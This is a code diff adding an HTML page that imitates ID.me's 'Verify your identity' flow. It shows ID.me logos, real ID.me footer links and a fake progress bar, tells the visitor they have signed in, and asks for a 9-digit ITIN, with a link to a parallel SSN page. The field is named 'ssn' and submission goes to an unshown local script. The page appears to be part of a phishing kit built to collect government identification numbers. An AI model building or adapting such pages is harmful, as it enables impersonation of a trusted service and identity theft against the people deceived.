@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="stylesheet" href="./css/auth.css">
+    <link rel="icon" type="image/png" sizes="32x32" href="../img/icon.ico">
+    <script src="https://kit.fontawesome.com/bcfb457481.js" crossorigin="anonymous"></script>
+    <title>Verify your identity - ID.me</title>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="../img/idme.svg">
+            <h2>+</h2>
+            <img src="../img/logo.svg">
+        </div>
+    </header>
+    <div class="container">
+        <h1 class="com">CONFIRM IT'S YOU</h1>
+        <div class="progress">
+            <div class="step">1</div>
+            <div class="step">2</div>
+            <div class="step">3</div>
+            <div class="step active">4</div>
+            <div class="step">5</div>
+        </div>
+        <p class="inform">You've signed in successfully</p>
+        <div class="message">Please properly fill out the required field</div>
+        <div class="tab code">
+            <label for="itin">Confirm your 9-digit ITIN number*</label>
+            <div class="passinput">
+                <input type="text" class="password" id="itin" name="ssn" maxlength="11" placeholder="XXX-XX-XXXX" autocomplete="one-time-code" inputmode="numeric" required>
+                <i class="toggle fa-solid fa-eye-slash fa-xl"></i>
+            </div>
+        </div>
+        <p class="help">Don't have an ITIN? <a href="./auth_ssn.html">Confirm your 9-digit SSN number</a></p>
+        <div class="form-footer">
+            <p>You will recieve your background check in your email soon, Do not restart the process!</p>
+        </div>
+        <button class="btn" id="sub_itin">Continue</button>
+    </div>
+    <footer>
+        <div class="language"><a href="">English</a></div>
+        <div class="link">
+                <div class="item"><a href="https://www.id.me/about?_ga=2.219718233.1547762766.1724082407-1041958704.1723783058">What is ID.me?</a></div>
+                <div class="item">|</div>
+                <div class="item"><a href="https://www.id.me/terms?_ga=2.10594804.1547762766.1724082407-1041958704.1723783058">Terms of Service</a></div>
+                <div class="item">|</div>
+                <div class="item"><a href="https://www.id.me/privacy?_ga=2.248761927.1547762766.1724082407-1041958704.1723783058">Privacy Policy</a></div>
+        </div>
+    </footer>
+    <div id="wait">Checking...</div>
+    <script src="./js/auth_itin.js"></script>
+</body>
+</html>
